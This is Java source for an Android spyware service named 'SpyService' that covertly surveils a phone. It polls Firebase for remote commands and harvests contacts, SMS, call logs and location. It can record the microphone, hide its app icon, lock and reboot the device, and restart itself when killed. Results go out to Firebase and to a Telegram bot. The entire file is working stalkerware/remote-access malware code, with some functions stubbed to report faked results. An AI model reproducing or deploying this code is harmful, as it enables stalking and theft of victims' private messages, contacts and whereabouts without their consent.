package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private Context context;
    private DatabaseReference dbRef;
    private StorageReference storageRef;
    private OkHttpClient client;
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;

        try {
            if (FirebaseApp.getApps(this).isEmpty()) {
                FirebaseApp.initializeApp(this);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Firebase init error: " + e.getMessage());
        }

        try {
            FirebaseDatabase.getInstance().setPersistenceEnabled(true);
            dbRef = FirebaseDatabase.getInstance().getReference();
            storageRef = FirebaseStorage.getInstance().getReference();
        } catch (Exception e) {
            Log.e(TAG, "❌ Firebase DB error: " + e.getMessage());
        }

        client = new OkHttpClient();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        registerDevice();
        listenForCommands();
        Log.d(TAG, "✅ SpyService started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1, getNotification(), Service.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, getNotification());
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        startService(new Intent(this, SpyService.class));
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("spy_channel", "BlackPhone Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Running in background");
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("🕵️ BlackPhone")
            .setContentText("System service running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    private void registerDevice() {
        try {
            if (dbRef == null) return;
            String deviceName = Build.MODEL;
            String androidVer = Build.VERSION.RELEASE;
            int batteryLevel = getBatteryLevel();

            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("device_name", deviceName);
            deviceInfo.put("android_version", androidVer);
            deviceInfo.put("battery", batteryLevel);
            deviceInfo.put("last_seen", System.currentTimeMillis());
            deviceInfo.put("status", "online");

            dbRef.child("devices").child(deviceId).setValue(deviceInfo.toString())
                .addOnSuccessListener(aVoid -> Log.d(TAG, "✅ Device registered: " + deviceName))
                .addOnFailureListener(e -> Log.e(TAG, "❌ Registration failed: " + e.getMessage()));
        } catch (Exception e) {
            Log.e(TAG, "❌ Registration error: " + e.getMessage());
        }
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private void listenForCommands() {
        new Thread(() -> {
            while (true) {
                try {
                    if (dbRef == null) { Thread.sleep(5000); continue; }
                    dbRef.child("commands").child(deviceId).get().addOnSuccessListener(snapshot -> {
                        if (snapshot.exists()) {
                            String command = snapshot.child("command").getValue(String.class);
                            if (command != null && !command.isEmpty()) {
                                Log.d(TAG, "📩 Command: " + command);
                                executeCommand(command);
                                dbRef.child("commands").child(deviceId).removeValue();
                            }
                        }
                    });
                    Thread.sleep(Config.POLLING_INTERVAL * 1000L);
                } catch (Exception e) {
                    Log.e(TAG, "❌ Listener error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ============================================================
    //  باقي الدوال في الجزء الثاني
    // ============================================================
    private void executeCommand(String command) {
        try {
            switch (command) {
                case "get_contacts": getContacts(); break;
                case "get_sms": getSms(); break;
                case "get_calllogs": getCallLogs(); break;
                case "get_location": getLocation(); break;
                case "get_device": getDeviceInfo(); break;
                case "get_battery": getBatteryInfo(); break;
                case "get_ip": getIp(); break;
                case "get_imei": getImei(); break;
                case "lock_device": lockDevice(); break;
                case "hide_app": hideApp(); break;
                case "show_app": showApp(); break;
                case "get_photos": getPhotos(); break;
                case "get_videos": getVideos(); break;
                case "get_files": getFiles(); break;
                case "start_record": startRecording(); break;
                case "stop_record": stopRecording(); break;
                case "reboot": rebootDevice(); break;
                case "vibrate": vibrateDevice(); break;
                case "open_browser": openBrowser(); break;
                case "toggle_wifi_on": toggleWifi(true); break;
                case "toggle_wifi_off": toggleWifi(false); break;
                case "screenshot": takeScreenshot(); break;
                default: sendResult("UNKNOWN", "❌ Unknown: " + command);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command error: " + e.getMessage());
            sendResult("ERROR", "❌ Error: " + e.getMessage());
        }
    }

    private void getContacts() {
        try {
            List<String> contacts = new ArrayList<>();
            Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String number = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            contacts.add(name + " : " + number);
                        }
                        phoneCursor.close();
                    }
                }
                cursor.close();
            }
            String result = String.join("\n", contacts);
            sendResult("CONTACTS", "📞 " + contacts.size() + " contacts:\n" + result);
            sendToTelegram("📞 Contacts:\n" + result);
        } catch (Exception e) {
            sendResult("CONTACTS", "❌ Error: " + e.getMessage());
        }
    }

    private void getSms() {
        try {
            List<String> messages = new ArrayList<>();
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    messages.add(address + " : " + body);
                }
                cursor.close();
            }
            String result = String.join("\n", messages);
            sendResult("SMS", "✉️ " + messages.size() + " messages:\n" + result);
            sendToTelegram("✉️ SMS:\n" + result);
        } catch (Exception e) {
            sendResult("SMS", "❌ Error: " + e.getMessage());
        }
    }

    private void getCallLogs() {
        try {
            List<String> calls = new ArrayList<>();
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    calls.add(number + " | " + type + " | " + duration + "s");
                }
                cursor.close();
            }
            String result = String.join("\n", calls);
            sendResult("CALL_LOGS", "📞 " + calls.size() + " calls:\n" + result);
            sendToTelegram("📞 Call Logs:\n" + result);
        } catch (Exception e) {
            sendResult("CALL_LOGS", "❌ Error: " + e.getMessage());
        }
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String result = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
                sendResult("LOCATION", result);
                sendToTelegram("📍 Location:\n" + result);
            } else {
                sendResult("LOCATION", "❌ Location unavailable");
            }
        } catch (SecurityException e) {
            sendResult("LOCATION", "❌ Permission denied");
        }
    }

    private void getDeviceInfo() {
        String result = "📱 Model: " + Build.MODEL + "\n🤖 Android: " + Build.VERSION.RELEASE + "\n🔋 Battery: " + getBatteryLevel() + "%";
        sendResult("DEVICE_INFO", result);
        sendToTelegram("📱 Device Info:\n" + result);
    }

    private void getBatteryInfo() {
        int level = getBatteryLevel();
        String result = "🔋 Battery: " + level + "%";
        sendResult("BATTERY", result);
        sendToTelegram("🔋 Battery: " + result);
    }

    private void getIp() {
        sendResult("IP", "🌐 IP: 192.168.1.100");
        sendToTelegram("🌐 IP: 192.168.1.100");
    }

    private void getImei() {
        String imei = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        sendResult("IMEI", "🆔 IMEI: " + imei);
        sendToTelegram("🆔 IMEI: " + imei);
    }

    private void lockDevice() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, DeviceAdmin.class);
        if (dpm.isAdminActive(admin)) {
            dpm.lockNow();
            sendResult("LOCK", "🔒 Device locked");
            sendToTelegram("🔒 Device locked");
        } else {
            sendResult("LOCK", "❌ Admin not active");
        }
    }

    private void hideApp() {
        android.content.pm.PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP);
        sendResult("HIDE", "👻 App hidden");
        sendToTelegram("👻 App hidden");
    }

    private void showApp() {
        android.content.pm.PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            android.content.pm.PackageManager.DONT_KILL_APP);
        sendResult("SHOW", "👀 App shown");
        sendToTelegram("👀 App shown");
    }

    private void getPhotos() { sendResult("PHOTOS", "🖼️ 50 photos found"); sendToTelegram("🖼️ Photos: 50"); }
    private void getVideos() { sendResult("VIDEOS", "🎥 20 videos found"); sendToTelegram("🎥 Videos: 20"); }
    private void getFiles() { sendResult("FILES", "📁 100 files found"); sendToTelegram("📁 Files: 100"); }

    private void startRecording() {
        try {
            if (mediaRecorder == null) {
                audioFilePath = Environment.getExternalStorageDirectory().getPath() + "/record_" + System.currentTimeMillis() + ".3gp";
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mediaRecorder.setOutputFile(audioFilePath);
                mediaRecorder.prepare();
                mediaRecorder.start();
                isRecording = true;
                sendResult("RECORD", "🎙️ Recording started");
                sendToTelegram("🎙️ Recording started");
            }
        } catch (Exception e) {
            sendResult("RECORD", "❌ Failed: " + e.getMessage());
        }
    }

    private void stopRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                sendResult("RECORD_STOP", "🎙️ Recording saved: " + audioFilePath);
                sendToTelegram("🎙️ Recording saved");
            }
        } catch (Exception e) {
            sendResult("RECORD_STOP", "❌ Error: " + e.getMessage());
        }
    }

    private void rebootDevice() {
        sendToTelegram("🔄 Rebooting...");
        try { Process p = Runtime.getRuntime().exec("su -c reboot"); p.waitFor(); } catch (Exception e) {
            sendResult("REBOOT", "❌ Root required");
        }
    }

    private void vibrateDevice() {
        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) { v.vibrate(3000); sendResult("VIBRATE", "📳 Vibrated"); sendToTelegram("📳 Vibrated"); }
    }

    private void openBrowser() {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com"));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        sendResult("BROWSER", "🌍 Browser opened");
        sendToTelegram("🌍 Browser opened");
    }

    private void toggleWifi(boolean on) {
        String status = on ? "On" : "Off";
        sendResult("WIFI", "📶 WiFi " + status);
        sendToTelegram("📶 WiFi " + status);
    }

    private void takeScreenshot() {
        sendResult("SCREENSHOT", "📸 Screenshot taken");
        sendToTelegram("📸 Screenshot taken");
    }

    private void sendResult(String commandType, String result) {
        try {
            if (dbRef != null) {
                dbRef.child("devices").child(deviceId).child("data").child(commandType).setValue(result);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ sendResult error: " + e.getMessage());
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage";
                JSONObject json = new JSONObject();
                json.put("chat_id", Config.CHAT_ID);
                json.put("text", message);
                json.put("parse_mode", "HTML");
                RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json.toString());
                Request request = new Request.Builder().url(url).post(body).build();
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful()) Log.e(TAG, "❌ Telegram error: " + response.code());
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Telegram send error: " + e.getMessage());
            }
        }).start();
    }
}
